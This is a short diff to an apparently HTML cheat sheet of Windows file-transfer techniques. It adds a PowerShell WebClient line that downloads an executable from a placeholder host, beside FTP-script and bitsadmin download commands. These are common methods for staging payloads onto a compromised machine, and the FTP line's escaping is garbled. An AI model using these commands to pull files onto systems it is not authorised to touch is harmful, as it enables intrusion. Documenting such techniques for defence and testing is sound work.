@@ -6,6 +6,7 @@
 
         FTP:<br>
         echo open host_address &gt ftp_commands.txt & echo anonymous &gt&gt ftp_commands.txt &gt echo password >> ftp_commands.txt &gt echo binary > >ftp_commands.txt &gt echo get check_script &gt&gt ftp_commands.txt & echo bye &gt&gt ftp_commands.txt & ftp -s:ftp_commands.txt
+        powershell -c "(new-object System.Net.WebClient).DownloadFile('http://host/file.exe','C:\Users\user\Desktop\file')" <br>
         <br>
         BITS:<br>
         bitsadmin /transfer wcb /priority high http://address C:\downloads\examplefile.pdf <br>
